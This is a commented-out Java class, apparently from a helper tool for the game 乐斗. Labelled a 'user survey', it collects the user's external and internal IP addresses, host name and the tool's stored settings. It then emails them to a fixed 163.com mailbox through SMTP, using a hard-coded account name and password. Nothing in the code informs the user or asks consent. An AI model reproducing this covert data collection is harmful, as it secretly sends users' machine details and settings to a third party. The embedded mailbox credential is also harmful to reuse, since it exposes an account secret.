/*package sendEmail;

import java.io.IOException;
import java.net.UnknownHostException;
import java.util.Properties;
import javax.mail.*;
import javax.mail.internet.*;

import util.UserUtil;
 
public class SendEMail {

	public static void send(){
	  String title = "乐斗助手用户调查";
	  StringBuilder context = new StringBuilder();
	  context.append(Net.getOutSideIp()+"\n");
	  try {
		  context.append(Net.getInSideIp()+"\n");
		  context.append(Net.getHostName()+"\n");
		  context.append(UserUtil.getSetting());
		  new SendEMail().send1(title, context.toString());
	  } catch (UnknownHostException e) {
		  // TODO Auto-generated catch block
		  e.printStackTrace();
	  } catch (IOException e) {
		// TODO Auto-generated catch block
		e.printStackTrace();
	} catch (Exception e) {
		// TODO Auto-generated catch block
		e.printStackTrace();
	}
  }
	
  private void send1(String title, String context) throws Exception {
     
    String host = "smtp.163.com";   //发件人使用发邮件的电子信箱服务器
    String from = "a1102349546@163.com";    //发邮件的出发地（发件人的信箱）
//    String to = "x845309355@163.com";   //发邮件的目的地（收件人信箱）
    String to = "15622385135@163.com";   //发邮件的目的地（收件人信箱）
 
    // Get system properties
    Properties props = System.getProperties();
 
    // Setup mail server
    props.put("mail.smtp.host", host);
 
    // Get session
    props.put("mail.smtp.auth", "true"); //这样才能通过验证
 
    MyAuthenticator myauth = new MyAuthenticator("a1102349546@163.com", "zzjian");
    Session session = Session.getDefaultInstance(props, myauth);
 
//    session.setDebug(true);
 
    // Define message
    MimeMessage message = new MimeMessage(session);
    
 
    // Set the from address
    message.setFrom(new InternetAddress(from));
 
    // Set the to address
    message.addRecipient(Message.RecipientType.TO,
      new InternetAddress(to));
 
    // Set the subject
    message.setSubject(title);
 
    // Set the content
    message.setText(context);
 
    message.saveChanges();
 
    Transport.send(message);
  }
}
 
 
class MyAuthenticator extends javax.mail.Authenticator {
private String strUser;
private String strPwd;
 
public MyAuthenticator(String user, String password) {
this.strUser = user;
this.strPwd = password;
}
 
protected PasswordAuthentication getPasswordAuthentication() {
return new PasswordAuthentication(strUser, strPwd);
}
}*/